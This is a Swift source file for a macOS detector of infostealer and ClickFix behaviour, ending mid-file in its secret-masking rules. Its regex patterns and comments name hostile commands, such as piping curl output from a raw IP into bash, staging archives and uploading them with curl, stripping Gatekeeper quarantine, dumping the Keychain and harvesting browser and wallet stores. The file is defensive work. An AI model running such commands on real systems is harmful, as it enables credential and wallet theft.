import Foundation

// Behavioural detection for today's macOS infostealers (AMOS / Atomic,
// Odyssey, MacSync, Poseidon, Go stealers) and the "ClickFix" lures that
// deliver them. These rarely leave a file a hash database knows: the user is
// talked into pasting a command into Terminal, and the payload lives in
// memory, a temp folder or a launch agent. So we look at *what commands do*.
//
// Design rules for every check here:
// - Each rule matches a behaviour that has no ordinary reason to exist on a
//   developer's Mac (node, pnpm, brew, docker, codex…), or is graded down to
//   `.medium` (listed for review, never pre-selected) when it can.
// - Pure functions over text. No file system, no network; callers inject
//   what they read.
// - Snippets shown to the user are truncated and secrets are masked: the
//   detector must never become a way to leak a password it saw.

/// How sure a behavioural rule is.
public enum ThreatSeverity: String, Codable, Sendable, CaseIterable, Comparable {
    /// Unusual and worth a look, but legitimate software can do it too.
    /// Listed under Possible Threats; never pre-selected.
    case medium
    /// Behaviour with no legitimate use in practice (fake password dialogs,
    /// decoded payloads run by a shell…). Treated like a confirmed hit.
    case high

    public static func < (lhs: ThreatSeverity, rhs: ThreatSeverity) -> Bool {
        lhs == .medium && rhs == .high
    }
}

/// Every behaviour the engine can report. The raw value is a stable id for
/// logs and tests.
public enum ThreatRule: String, Codable, Sendable, CaseIterable {
    // Commands, scripts, launch item arguments
    case remoteScriptToShell = "remote-script-to-shell"
    case encodedPayloadToShell = "encoded-payload-to-shell"
    case fakePasswordPrompt = "fake-password-prompt"
    case passwordVerification = "password-verification"
    case stagingUpload = "staging-upload"
    case payloadDropExecute = "payload-drop-execute"
    case keychainExtraction = "keychain-extraction"
    case credentialHarvest = "credential-harvest"
    // Launch agents / daemons
    case launchItemSuspiciousLocation = "launch-item-suspicious-location"
    case launchItemFakeApple = "launch-item-fake-apple"
    // Files left on disk
    case unsignedExecutableDropped = "unsigned-executable-dropped"
    case stagingArchive = "staging-archive"

    /// Rules found by reading command text (vs. location / signature).
    public var isCommandRule: Bool {
        switch self {
        case .remoteScriptToShell, .encodedPayloadToShell, .fakePasswordPrompt, .passwordVerification,
             .stagingUpload, .payloadDropExecute, .keychainExtraction, .credentialHarvest: true
        default: false
        }
    }

    public var title: String {
        switch self {
        case .remoteScriptToShell:
            UIText.t("Scarica ed esegue codice remoto", "Downloads and runs remote code")
        case .encodedPayloadToShell:
            UIText.t("Esegue un comando nascosto (codificato)", "Runs a hidden (encoded) command")
        case .fakePasswordPrompt:
            UIText.t("Finestra della password falsa", "Fake password prompt")
        case .passwordVerification:
            UIText.t("Verifica la password di login", "Checks your login password")
        case .stagingUpload:
            UIText.t("Comprime dati e li invia", "Packs data and uploads it")
        case .payloadDropExecute:
            UIText.t("Prepara ed esegue un programma scaricato", "Prepares and runs a downloaded program")
        case .keychainExtraction:
            UIText.t("Legge segreti dal Portachiavi", "Reads secrets from the Keychain")
        case .credentialHarvest:
            UIText.t("Raccoglie password, cookie o wallet", "Collects passwords, cookies or wallets")
        case .launchItemSuspiciousLocation:
            UIText.t("Avvia un programma non firmato da una cartella insolita", "Starts an unsigned program from an unusual folder")
        case .launchItemFakeApple:
            UIText.t("Si spaccia per un componente Apple", "Pretends to be an Apple component")
        case .unsignedExecutableDropped:
            UIText.t("Programma non firmato in una cartella temporanea", "Unsigned program in a temporary folder")
        case .stagingArchive:
            UIText.t("Archivio sospetto in una cartella temporanea", "Suspicious archive in a temporary folder")
        }
    }

    public var explanation: String {
        switch self {
        case .remoteScriptToShell:
            UIText.t(
                "Passa uno script scaricato da internet direttamente a una shell, senza alcun controllo. È così che gli attacchi ClickFix installano gli infostealer.",
                "Pipes a script downloaded from the internet straight into a shell, with nothing checked first. This is how ClickFix attacks install infostealers.")
        case .encodedPayloadToShell:
            UIText.t(
                "Decodifica testo base64 o esadecimale e lo esegue come comando. Un installer legittimo non ha motivo di nascondere cosa esegue.",
                "Decodes base64 or hex text and runs it as a command. A legitimate installer has no reason to hide what it runs.")
        case .fakePasswordPrompt:
            UIText.t(
                "Mostra una finestra con un campo nascosto per chiederti la password. Infostealer come AMOS e Odyssey la usano per rubare la password di login.",
                "Shows a dialog with a hidden answer field to ask for your password. Infostealers such as AMOS and Odyssey use it to steal your login password.")
        case .passwordVerification:
            UIText.t(
                "Usa dscl -authonly per verificare se una password digitata è quella di login, come fanno gli infostealer prima di sbloccare il Portachiavi.",
                "Uses dscl -authonly to test whether a typed password is your login password, as infostealers do before unlocking your Keychain.")
        case .stagingUpload:
            UIText.t(
                "Crea un archivio in una cartella temporanea e lo invia con curl: l'ultimo passo tipico di un infostealer.",
                "Creates an archive in a temporary folder and uploads it with curl: the typical last step of an infostealer.")
        case .payloadDropExecute:
            UIText.t(
                "Salva un programma in una cartella temporanea o condivisa, lo rende eseguibile (togliendo la quarantena di Apple) e lo avvia, aggirando i controlli di Gatekeeper.",
                "Saves a program in a temporary or shared folder, makes it executable (removing Apple's quarantine flag) and runs it, bypassing Gatekeeper's checks.")
        case .keychainExtraction:
            UIText.t(
                "Esporta il Portachiavi o legge la chiave Safe Storage di un browser, che decifra password e cookie salvati.",
                "Dumps the Keychain or reads a browser's Safe Storage key, which decrypts saved passwords and cookies.")
        case .credentialHarvest:
            UIText.t(
                "Accede ad archivi di password e cookie dei browser, a dati di wallet crypto o di Telegram/Note e li comprime, copia o invia.",
                "Accesses browser password and cookie stores, crypto wallet data or Telegram/Notes data and archives, copies or uploads them.")
        case .launchItemSuspiciousLocation:
            UIText.t(
                "Un agente o demone di avvio esegue codice senza una firma Developer ID valida da una cartella nascosta, temporanea, condivisa o dal nome casuale, dove il malware si nasconde per sopravvivere ai riavvii.",
                "A launch agent or daemon starts code without a valid Developer ID signature from a hidden, temporary, shared or randomly named folder, where malware hides to survive restarts.")
        case .launchItemFakeApple:
            UIText.t(
                "Usa un nome Apple (com.apple.*) ma esegue codice non firmato da Apple. macOS tiene i propri elementi di avvio in /System, mai qui.",
                "Uses an Apple name (com.apple.*) but runs code Apple didn't sign. macOS keeps its own launch items in /System, never here.")
        case .unsignedExecutableDropped:
            UIText.t(
                "Un programma creato di recente, senza firma valida, in una cartella temporanea, condivisa o nascosta, dove i dropper mettono il loro payload.",
                "A recently created program without a valid signature in a temporary, shared or hidden folder, where droppers put their payload.")
        case .stagingArchive:
            UIText.t(
                "Uno zip recente in una cartella temporanea, con il nome tipico degli archivi che gli infostealer creano prima di inviare i dati rubati. I tuoi dati potrebbero essere già stati inviati.",
                "A recent zip in a temporary folder, named like the archives infostealers create before uploading stolen data. Your data may already have been sent.")
        }
    }
}

/// One rule hit.
public struct ThreatFinding: Hashable, Sendable, Codable {
    public let rule: ThreatRule
    public let severity: ThreatSeverity
    /// The matched text, truncated and with secrets masked. Safe to show.
    public let snippet: String
    /// Found inside a base64 / hex payload the command decodes.
    public let decoded: Bool

    public init(rule: ThreatRule, severity: ThreatSeverity, snippet: String, decoded: Bool = false) {
        self.rule = rule
        self.severity = severity
        self.snippet = snippet
        self.decoded = decoded
    }
}

/// Looks at a command line, a script, or a launch item's ProgramArguments
/// and says which infostealer / ClickFix behaviours it contains.
public enum ThreatCommandAnalyzer {
    /// Longer input is cut: real scripts and one-liners are far smaller.
    public static let maxInputBytes = 512 * 1024
    static let maxDecodedPayloadBytes = 64 * 1024
    static let maxDecodedPayloads = 8
    public static let snippetLimit = 160

    public static func analyze(_ text: String) -> [ThreatFinding] {
        analyze(text, depth: 0)
    }

    /// A launch item's argv. Joined with spaces: `["/bin/sh", "-c", "curl …|sh"]`
    /// reads exactly like the command line it runs.
    public static func analyze(arguments: [String]) -> [ThreatFinding] {
        analyze(arguments.joined(separator: " "))
    }

    // MARK: - Engine

    static func analyze(_ raw: String, depth: Int) -> [ThreatFinding] {
        let bounded = raw.utf8.count > maxInputBytes
            ? String(decoding: Array(raw.utf8.prefix(maxInputBytes)), as: UTF8.self)
            : raw
        // Normalise only when a shell could be hiding a word (quotes, `\`,
        // `$`); `ls`, `git status` and friends skip straight to the gate.
        let mayBeObfuscated = bounded.contains(where: { $0 == "'" || $0 == "\"" || $0 == "\\" || $0 == "$" || $0 == "\t" })
        let text = mayBeObfuscated ? normalize(bounded) : bounded
        let lower = text.lowercased()
        guard prefilterTokens.contains(where: { lower.contains($0) }) else { return [] }
        func has(_ words: String...) -> Bool { words.contains { lower.contains($0) } }

        // Each rule runs only when its keyword is present, so a history
        // line costs a handful of substring checks and at most a few regexes.
        var findings: [ThreatFinding] = []
        let fetches = has("curl", "wget", "nscurl")
        if fetches { findings += remoteScriptFindings(text, insideDecoded: depth > 0) }
        if has("base64", "xxd", "printf", "echo -e", "b64decode") { findings += encodedPayloadFindings(text) }
        if has("hidden"), let range = Patterns.fakePrompt.firstRange(in: text) {
            findings.append(finding(.fakePasswordPrompt, .high, text, range))
        }
        if has("dscl"), let range = Patterns.dsclAuthOnly.firstRange(in: text) {
            findings.append(finding(.passwordVerification, .high, text, range))
        }
        if fetches { findings += stagingFindings(text) }
        if has("chmod") { findings += dropExecuteFindings(text) }
        if has("security") { findings += keychainFindings(text) }
        findings += credentialFindings(text, lower: lower)

        if depth == 0 {
            for payload in decodedPayloads(in: text) {
                findings += analyze(payload, depth: 1).map {
                    ThreatFinding(rule: $0.rule, severity: $0.severity, snippet: "base64 → " + $0.snippet, decoded: true)
                }
            }
        }
        return strongestPerRule(findings)
    }

    /// Cheap gate so a 20 000-line shell history costs almost nothing:
    /// every rule needs at least one of these words.
    static let prefilterTokens: [String] = [
        "curl", "wget", "nscurl", "base64", "b64decode", "xxd", "osascript", "hidden answer", "hiddenanswer",
        "dscl", "xattr", "chmod", "security", "ditto", "zip", "tar ", "login data", "cookies", "keychain",
        "extension settings", "application support", "telegram", "notestore", "notes", "key4.db",
        "logins.json", "local state", "web data", "electrum", "exodus", "printf", "echo -e",
    ] + ProtectedUserData.walletExtensionIDs.keys.map { $0 }

    // MARK: Normalisation

    /// Undoes the cheap obfuscation pasted one-liners use, so every rule sees
    /// the command a shell would run: `\`-newline continuations, `$IFS`
    /// instead of spaces, quotes splitting words (`c''url`, `"cu"rl`),
    /// backslash-escaped letters (`c\url`), tabs and runs of spaces. Case is
    /// kept (base64 needs it); rules match case-insensitively.
    public static func normalize(_ text: String) -> String {
        var s = text.replacingOccurrences(of: "\\\r\n", with: "")
            .replacingOccurrences(of: "\\\n", with: "")
        if s.contains("IFS") {
            s = Patterns.ifs.regex.stringByReplacingMatches(
                in: s, range: NSRange(s.startIndex..., in: s), withTemplate: " ")
        }
        var out = String.UnicodeScalarView()
        out.reserveCapacity(s.unicodeScalars.count)
        let scalars = Array(s.unicodeScalars)
        var lastWasSpace = false
        var i = 0
        while i < scalars.count {
            let c = scalars[i]
            i += 1
            if c == "'" || c == "\"" { continue }
            if c == "\\", i < scalars.count {
                let next = scalars[i]
                if CharacterSet.alphanumerics.contains(next) || " /._-".unicodeScalars.contains(next) {
                    continue // the escaped character is kept on the next turn
                }
            }
            if c == " " || c == "\t" {
                if lastWasSpace { continue }
                lastWasSpace = true
                out.append(" ")
                continue
            }
            lastWasSpace = false
            out.append(c)
        }
        return String(out)
    }

    // MARK: Rule: remote code piped into an interpreter

    /// Installers developers run every day. Matched on exact host plus path
    /// prefix over https, so `raw.githubusercontent.com/<attacker>/…` and
    /// look-alike domains are never trusted. Each is the vendor's documented
    /// install command (Homebrew: brew.sh, nvm, Oh My Zsh, rustup, pnpm,
    /// Bun, Deno, uv/ruff, Claude Code, fnm, Volta, Poetry, Ollama,
    /// Starship, Docker, Tailscale, Railway).
    static let trustedInstallers: [(host: String, pathPrefix: String)] = [
        ("raw.githubusercontent.com", "/homebrew/install/"),
        ("raw.githubusercontent.com", "/nvm-sh/nvm/"),
        ("raw.githubusercontent.com", "/ohmyzsh/ohmyzsh/"),
        ("sh.rustup.rs", "/"),
        ("get.pnpm.io", "/"),
        ("bun.sh", "/install"),
        ("deno.land", "/install.sh"),
        ("deno.land", "/x/install/"),
        ("astral.sh", "/uv/"),
        ("astral.sh", "/ruff/"),
        ("claude.ai", "/install.sh"),
        ("fnm.vercel.app", "/install"),
        ("get.volta.sh", "/"),
        ("install.python-poetry.org", "/"),
        ("ollama.com", "/install.sh"),
        ("starship.rs", "/install.sh"),
        ("get.docker.com", "/"),
        ("tailscale.com", "/install.sh"),
        ("railway.app", "/install.sh"),
        ("railway.com", "/install.sh"),
    ]

    public static func isTrustedInstallerURL(_ string: String) -> Bool {
        guard let url = URL(string: string), url.scheme?.lowercased() == "https",
              let host = url.host?.lowercased(), url.user == nil else { return false }
        let path = (url.path.isEmpty ? "/" : url.path).lowercased()
        return trustedInstallers.contains { host == $0.host && path.hasPrefix($0.pathPrefix) }
    }

    /// `curl … | sh` and `sh -c "$(curl …)"` are how both ClickFix and many
    /// real installers work, so the rule is graded instead of all-or-nothing:
    /// - trusted installer over https → nothing;
    /// - plain http, a raw IP, `-k`/`--insecure`, hidden in the background,
    ///   or assembled from a decoded string → `.high` (what ClickFix pages
    ///   actually paste: `/bin/bash -c "$(curl -fsSL http://45.x.x.x/i.sh)"`,
    ///   `curl -s domain/x | nohup bash &`);
    /// - any other https vendor script → `.medium`, for review.
    static func remoteScriptFindings(_ text: String, insideDecoded: Bool) -> [ThreatFinding] {
        var results: [ThreatFinding] = []
        var matches = Patterns.remotePipe.ranges(in: text).filter { readsProgramFromStdin(text, after: $0) }
        matches += Patterns.remoteSubstitution.ranges(in: text)
        for range in matches {
            let segment = String(text[range])
            let line = lineContaining(range, in: text)
            let urls = Patterns.url.ranges(in: segment).map { String(segment[$0]) }
            let hasDecode = Patterns.decodeOp.firstRange(in: line) != nil
            var high = insideDecoded || hasDecode
            if Patterns.insecureFlag.firstRange(in: segment) != nil { high = true }
            if Patterns.backgrounded.firstRange(in: line) != nil { high = true }
            if urls.isEmpty {
                // `curl -s evil.example/x | sh`: no scheme means plain http.
                if Patterns.bareHost.firstRange(in: segment) != nil { high = true }
            } else {
                for url in urls {
                    let lowered = url.lowercased()
                    if !lowered.hasPrefix("https://") { high = true }
                    if let host = URL(string: url)?.host, Patterns.ipv4.wholeMatch(host) { high = true }
                }
                if !high, urls.allSatisfy(isTrustedInstallerURL) { continue }
            }
            results.append(finding(.remoteScriptToShell, high ? .high : .medium, text, range))
        }
        return results
    }

    /// `| python3 -m json.tool`, `| perl -e '…'`, `| bash -c '…'` treat the
    /// download as data, not code: pretty-printing JSON is not remote code
    /// execution. Only an interpreter that reads its program from stdin counts.
    static func readsProgramFromStdin(_ text: String, after range: Range<String.Index>) -> Bool {
        let rest = text[range.upperBound...].prefix(12).lowercased()
        let next = rest.drop(while: { $0 == " " }).prefix(while: { $0 != " " && $0 != "\n" })
        return !["-c", "-e", "-m", "-ce", "-ec"].contains(String(next))
    }

    // MARK: Rule: decoded text run by an interpreter

    /// `echo <b64> | base64 -d | bash`, `sh -c "$(echo … | base64 --decode)"`,
    /// `xxd -r -p | sh`, `printf '\x63\x75…' | sh`, python `exec(b64decode(…))`.
    /// No installer hides its commands like this; always `.high`.
    static func encodedPayloadFindings(_ text: String) -> [ThreatFinding] {
        for pattern in [Patterns.decodePipe, Patterns.decodeSubstitution, Patterns.hexEscapePipe, Patterns.pythonExecDecode] {
            if let range = pattern.firstRange(in: text) {
                return [finding(.encodedPayloadToShell, .high, text, range)]
            }
        }
        return []
    }

    /// Base64 / hex blobs the text decodes, for one more pass of analysis.
    /// Bounded in count and size; only text-like results are kept.
    static func decodedPayloads(in text: String) -> [String] {
        let decodesBase64 = Patterns.base64Op.firstRange(in: text) != nil
        let decodesHex = Patterns.hexOp.firstRange(in: text) != nil
        guard decodesBase64 || decodesHex else { return [] }
        var payloads: [String] = []
        var seen = Set<String>()
        let blobPattern = decodesBase64 ? Patterns.base64Blob : Patterns.hexBlob
        for range in blobPattern.ranges(in: text) {
            guard payloads.count < maxDecodedPayloads else { break }
            let blob = String(text[range])
            guard blob.utf8.count <= maxDecodedPayloadBytes * 2, seen.insert(blob).inserted else { continue }
            let data = decodesBase64 ? decodeBase64(blob) : decodeHex(blob)
            guard let data, let decoded = printableText(data) else { continue }
            payloads.append(decoded)
        }
        return payloads
    }

    static func decodeBase64(_ blob: String) -> Data? {
        var padded = blob
        let remainder = padded.count % 4
        if remainder == 1 { return nil }
        if remainder > 0 { padded += String(repeating: "=", count: 4 - remainder) }
        return Data(base64Encoded: padded)
    }

    static func decodeHex(_ blob: String) -> Data? {
        guard blob.count % 2 == 0 else { return nil }
        var data = Data(capacity: blob.count / 2)
        var index = blob.startIndex
        while index < blob.endIndex {
            let next = blob.index(index, offsetBy: 2)
            guard let byte = UInt8(blob[index..<next], radix: 16) else { return nil }
            data.append(byte)
            index = next
        }
        return data
    }

    /// Decoded bytes that read as a command (≥ 90 % printable), else nil.
    static func printableText(_ data: Data) -> String? {
        guard !data.isEmpty, data.count <= maxDecodedPayloadBytes else { return nil }
        let printable = data.filter { ($0 >= 0x20 && $0 < 0x7F) || $0 == 0x0A || $0 == 0x0D || $0 == 0x09 }.count
        guard Double(printable) / Double(data.count) >= 0.9 else { return nil }
        return String(decoding: data, as: UTF8.self)
    }

    // MARK: Rule: archive in a temp folder + upload

    /// AMOS / Odyssey / Poseidon end with `ditto -c -k … /tmp/out.zip` and
    /// `curl -F file=@/tmp/out.zip http://…`. Both together → `.high`. An
    /// upload of a zip straight from a temp folder → `.medium` (it could be a
    /// support upload a developer typed).
    static func stagingFindings(_ text: String) -> [ThreatFinding] {
        let archive = Patterns.archiveToTemp.firstRange(in: text)
        let upload = Patterns.upload.firstRange(in: text)
        if let archive, let upload {
            let first = archive.lowerBound < upload.lowerBound ? archive : upload
            return [finding(.stagingUpload, .high, text, first)]
        }
        if let range = Patterns.uploadTempZip.firstRange(in: text) {
            return [finding(.stagingUpload, .medium, text, range)]
        }
        return []
    }

    // MARK: Rule: payload dropped, made executable and run from a temp folder

    /// `curl -o /tmp/update … && xattr -c /tmp/update && chmod +x /tmp/update
    /// && /tmp/update`. Stripping quarantine on a file in a temp / shared
    /// folder and making it executable → `.high`. Stripping quarantine on an
    /// app in /Applications (common for unsigned open-source apps) is NOT
    /// flagged: the temp-folder location is required. Download + chmod +x +
    /// run from a temp folder without the xattr step → `.medium`.
    static func dropExecuteFindings(_ text: String) -> [ThreatFinding] {
        guard Patterns.tempPath.firstRange(in: text) != nil,
              let chmod = Patterns.chmodExecutable.firstRange(in: text) else { return [] }
        if let strip = Patterns.stripQuarantine.firstRange(in: text) {
            return [finding(.payloadDropExecute, .high, text, strip.lowerBound < chmod.lowerBound ? strip : chmod)]
        }
        if let download = Patterns.downloadToFile.firstRange(in: text),
           Patterns.executeFromTemp.firstRange(in: text) != nil {
            return [finding(.payloadDropExecute, .medium, text, download)]
        }
        return []
    }

    // MARK: Rule: Keychain secrets

    /// `security dump-keychain` and reading a browser's "Safe Storage" key
    /// (`security find-generic-password -wa 'Chrome'`), which decrypts the
    /// browser's saved passwords and cookies. Developers reading their own
    /// tokens with `find-generic-password -s myservice -w` are not flagged.
    static func keychainFindings(_ text: String) -> [ThreatFinding] {
        for pattern in [Patterns.dumpKeychain, Patterns.browserSafeStorage] {
            if let range = pattern.firstRange(in: text) {
                return [finding(.keychainExtraction, .high, text, range)]
            }
        }
        return []
    }

    // MARK: Rule: credential / wallet stores collected

    /// Names that only matter to a stealer: browser credential databases,
    /// wallet extension storage ids, wallet app folders, Telegram sessions,
    /// the Notes database, the login keychain file.
    static let credentialTargets: [(needle: String, name: String)] = [
        ("login data", "Login Data"), ("web data", "Web Data"), ("local state", "Local State"),
        ("/cookies", "Cookies"), ("cookies.sqlite", "cookies.sqlite"), ("cookies.binarycookies", "Cookies.binarycookies"),
        ("key4.db", "key4.db"), ("logins.json", "logins.json"),
        ("local extension settings", "Local Extension Settings"),
        ("login.keychain", "login.keychain"), ("library/keychains", "Keychains"),
        ("application support/atomic", "Atomic Wallet"), ("exodus.wallet", "Exodus"),
        ("application support/exodus", "Exodus"), ("application support/electrum", ".electrum"), ("/.electrum", "Electrum"),
        ("mymonero", "MyMonero"), ("trezor suite", "Trezor Suite"), ("ledger live", "Ledger Live"),
        ("application support/guarda", "Guarda"), ("application support/coinomi", "Coinomi"),
        (".walletwasabi", "Wasabi"), ("bitcoin/wallets", "Bitcoin Core"),
        ("telegram desktop", "Telegram"), ("tdata", "Telegram"), ("ru.keepcoder.telegram", "Telegram"),
        ("group.com.apple.notes", "Notes"), ("notestore.sqlite", "Notes"),
    ] + ProtectedUserData.walletExtensionIDs.map { ($0.key, $0.value) }

    /// Touching one of these and also archiving / copying to a temp folder /
    /// uploading → `.high`. Naming three or more distinct stores without an
    /// exfiltration step (a stealer's target list) → `.medium`.
    static func credentialFindings(_ text: String, lower: String) -> [ThreatFinding] {
        var names: [String] = []
        for target in credentialTargets where lower.contains(target.needle) && !names.contains(target.name) {
            names.append(target.name)
        }
        guard !names.isEmpty else { return [] }
        let exfiltrates = Patterns.archiveAny.firstRange(in: text) != nil
            || Patterns.upload.firstRange(in: text) != nil
            || Patterns.copyToTemp.firstRange(in: text) != nil
        let snippet = truncate(names.prefix(6).joined(separator: ", ") + (names.count > 6 ? ", …" : ""))
        if exfiltrates { return [ThreatFinding(rule: .credentialHarvest, severity: .high, snippet: snippet)] }
        if names.count >= 3 { return [ThreatFinding(rule: .credentialHarvest, severity: .medium, snippet: snippet)] }
        return []
    }

    // MARK: Helpers

    static func finding(_ rule: ThreatRule, _ severity: ThreatSeverity, _ text: String, _ range: Range<String.Index>) -> ThreatFinding {
        ThreatFinding(rule: rule, severity: severity, snippet: snippet(String(text[range])))
    }

    /// Masked and truncated: what the UI may show.
    public static func snippet(_ text: String) -> String {
        truncate(SecretMasker.mask(text.replacingOccurrences(of: "\n", with: " ")))
    }

    static func truncate(_ text: String, limit: Int = snippetLimit) -> String {
        text.count > limit ? String(text.prefix(limit - 1)) + "…" : text
    }

    static func lineContaining(_ range: Range<String.Index>, in text: String) -> String {
        let start = text[..<range.lowerBound].lastIndex(of: "\n").map { text.index(after: $0) } ?? text.startIndex
        let end = text[range.upperBound...].firstIndex(of: "\n") ?? text.endIndex
        return String(text[start..<end])
    }

    /// One finding per rule: the most severe, first seen.
    static func strongestPerRule(_ findings: [ThreatFinding]) -> [ThreatFinding] {
        var order: [ThreatRule] = []
        var best: [ThreatRule: ThreatFinding] = [:]
        for f in findings {
            if let existing = best[f.rule] {
                if f.severity > existing.severity { best[f.rule] = f }
            } else {
                order.append(f.rule)
                best[f.rule] = f
            }
        }
        return order.compactMap { best[$0] }
    }
}

// MARK: - Patterns

/// NSRegularExpression is immutable and thread-safe once built.
struct ThreatPattern: @unchecked Sendable {
    let regex: NSRegularExpression

    init(_ pattern: String) {
        // Patterns are compile-time constants covered by tests.
        regex = try! NSRegularExpression(pattern: pattern, options: [.caseInsensitive])
    }

    func firstRange(in text: String) -> Range<String.Index>? {
        regex.firstMatch(in: text, range: NSRange(text.startIndex..., in: text)).flatMap { Range($0.range, in: text) }
    }

    func ranges(in text: String) -> [Range<String.Index>] {
        regex.matches(in: text, range: NSRange(text.startIndex..., in: text)).compactMap { Range($0.range, in: text) }
    }

    func wholeMatch(_ text: String) -> Bool {
        guard let range = firstRange(in: text) else { return false }
        return range == text.startIndex..<text.endIndex
    }
}

enum Patterns {
    /// An interpreter that can run code: shells, osascript, python, perl,
    /// ruby; optionally behind sudo / nohup / env or an absolute path.
    static let interpreter = #"(?:sudo\s+(?:-\S+\s+)*)?(?:nohup\s+)?(?:/usr/bin/env\s+)?(?:/[\w./-]*/)?(?:(?:ba|z|da|k|tc|c|fi)?sh|osascript|python[0-9.]*|perl|ruby)\b"#
    static let fetcher = #"\b(?:curl|wget|nscurl)\b"#
    static let tempDir = #"(?:/private)?/tmp/|(?:/private)?/var/folders/|\$\{?tmpdir\}?|/users/shared/"#

    static let ifs = ThreatPattern(#"\$\{IFS[^}]*\}|\$IFS\b"#)

    /// `curl … | sh` with up to two filters in between (`| tee x | sh`).
    static let remotePipe = ThreatPattern(fetcher + #"[^|;&\n]*(?:\|[^|;&\n]*){0,2}?\|\s*"# + interpreter)
    /// `sh -c "$(curl …)"`, `eval "$(curl …)"`, `` bash -c `curl …` ``, `bash <(curl …)`.
    static let remoteSubstitution = ThreatPattern(
        #"\b(?:(?:ba|z|da|k)?sh|eval|source|osascript)\b[^\n;|]*?(?:\$\(|`|<\()\s*"# + fetcher + #"[^)`\n]*"#)
    static let url = ThreatPattern(#"\b(?:https?|ftp)://[^\s|;&)`<>]+"#)
    static let bareHost = ThreatPattern(fetcher + #"\s+(?:-\S+\s+)*[a-z0-9-]+(?:\.[a-z0-9-]+)+(?::\d+)?/"#)
    static let ipv4 = ThreatPattern(#"\d{1,3}(?:\.\d{1,3}){3}"#)
    static let insecureFlag = ThreatPattern(#"(?:\s-[a-z]*k[a-z]*\b|--insecure\b|--no-check-certificate\b)"#)
    static let backgrounded = ThreatPattern(#"\bnohup\b|>\s*/dev/null[^\n]*&\s*$|&\s*disown\b"#)

    static let base64Op = ThreatPattern(#"\bbase64\b[^|;\n]*?(?:\s-d\b|\s-D\b|--decode\b)|\bopenssl\b[^|;\n]*\bbase64\b[^|;\n]*\s-d\b|\bb64decode\b"#)
    static let hexOp = ThreatPattern(#"\bxxd\b[^|;\n]*\s-r\b"#)
    static let decodeOp = ThreatPattern(#"\bbase64\b[^|;\n]*?(?:\s-d\b|\s-D\b|--decode\b)|\bxxd\b[^|;\n]*\s-r\b|\bopenssl\b[^|;\n]*\bbase64\b"#)
    static let decodePipe = ThreatPattern(
        #"(?:\bbase64\b[^|;\n]*?(?:\s-d\b|\s-D\b|--decode\b)|\bxxd\b[^|;\n]*\s-r\b|\bopenssl\b[^|;\n]*\bbase64\b[^|;\n]*\s-d\b)[^|;\n]*(?:\|[^|;\n]*){0,2}?\|\s*"#
        + interpreter)
    static let decodeSubstitution = ThreatPattern(
        #"\b(?:(?:ba|z|da|k)?sh\s+-c|eval|osascript\s+-e)\s+(?:\$\(|`)[^)`\n]*(?:\bbase64\b[^)`\n]*?(?:\s-d\b|\s-D\b|--decode\b)|\bxxd\b[^)`\n]*\s-r\b)"#)
    static let hexEscapePipe = ThreatPattern(
        #"\b(?:printf|echo\s+-e)\s+(?:\\?x[0-9a-f]{2}){6,}[^|;\n]*\|\s*"# + interpreter)
    static let pythonExecDecode = ThreatPattern(#"\bexec\s*\(\s*(?:base64\.)?b64decode\s*\("#)
    static let base64Blob = ThreatPattern(#"(?<![A-Za-z0-9+/=])[A-Za-z0-9+/]{20,}={0,2}(?![A-Za-z0-9+/=])"#)
    static let hexBlob = ThreatPattern(#"(?<![0-9a-fA-F])(?:[0-9a-fA-F]{2}){10,}(?![0-9a-fA-F])"#)

    static let fakePrompt = ThreatPattern(#"\bdisplay\s+dialog\b[^\n]*?\bhidden\s+answer\b|\bhiddenAnswer\s*:\s*true\b"#)
    static let dsclAuthOnly = ThreatPattern(#"\bdscl\s+(?:\.|/local/default|localhost|/search)\s+-authonly\b(?:\s+\S+){0,2}"#)

    static let archiveToTemp = ThreatPattern(
        #"\b(?:ditto\s+(?:-\S+\s+)*-c\w*|ditto\s+-\w*c\w*|zip\s+|tar\s+-?\w*c\w*)[^\n;&|]*?(?:"# + tempDir + ")")
    static let archiveAny = ThreatPattern(#"\b(?:ditto\s+(?:-\S+\s+)*-\w*c|zip\s+-?\w*|tar\s+-?\w*c\w*)\b"#)
    static let upload = ThreatPattern(
        fetcher + #"[^\n;&|]*?(?:\s-F\s|\s--form(?:-string)?\s|--data-binary\s+@|\s-d\s+@|--data(?:-raw)?\s+@|\s-T\s|--upload-file\s)|\bwget\b[^\n;&|]*--post-file"#)
    static let uploadTempZip = ThreatPattern(
        fetcher + #"[^\n;&|]*?(?:-F\s+\S*=@|--data-binary\s+@|-T\s+|--upload-file\s+)(?:"# + tempDir + #")\S*\.zip\b"#)
    static let copyToTemp = ThreatPattern(#"\b(?:cp|ditto|rsync|mv)\b[^\n;&|]*?(?:"# + tempDir + ")")

    static let tempPath = ThreatPattern(tempDir)
    static let chmodExecutable = ThreatPattern(#"\bchmod\s+(?:-\w+\s+)*(?:[ugoa]*\+\w*x|(?=[0-7]{3,4}\b)[0-7]*[1357][0-7]*)\b"#)
    static let stripQuarantine = ThreatPattern(#"\bxattr\s+(?:-\w+\s+)*-\w*[cd]\w*\b"#)
    static let downloadToFile = ThreatPattern(fetcher + #"[^\n;&|]*?(?:\s-o\s*\S|\s--output\s|\s-O\b|\s>\s*\S)"#)
    static let executeFromTemp = ThreatPattern(
        #"(?:^|&&|;|\|\||\bnohup|\bopen(?:\s+-a\s+\S+)?)\s*(?:"# + tempDir + ")")

    static let dumpKeychain = ThreatPattern(#"\bsecurity\s+dump-keychain\b"#)
    static let browserSafeStorage = ThreatPattern(
        #"\bsecurity\s+find-generic-password\b[^\n;|]*?(?:safe\s+storage|\b(?:chrome|chromium|brave|edge|opera|vivaldi|arc|yandex)\b)"#)
}

// MARK: - Secret masking

/// Masks anything in a snippet that may be a password or token before it is
/// shown or logged. Errs on the side of masking.
public enum SecretMasker {
    static let mask = "•••"

    static let rules: [(ThreatPattern, String)] = [
        // dscl . -authonly <user> <password>
        (ThreatPattern(#"(-authonly\s+\S+\s+)\S+"#), "$1" + mask),
        // -p <password> / --password <x> / -password <x>
        (ThreatPattern(#"((?:^|\s)(?:-p|--?password|--?passwd|--?pass)(?:\s+|=))\S+"#), "$1" + mask),
        // password=… token=… secret=… key=…
        (ThreatPattern(#"\b((?:pass(?:word|wd)?|pwd|token|secret|api[_-]?key|access[_-]?key|auth)\s*[=:]\s*)[^\s&]+"#), "$1" + mask),
        // Authorization headers
        (ThreatPattern(#"\b((?:bearer|basic)\s+)[A-Za-z0-9._~+/=-]+"#), "$1" + mask),
        // user:pass@ in URLs
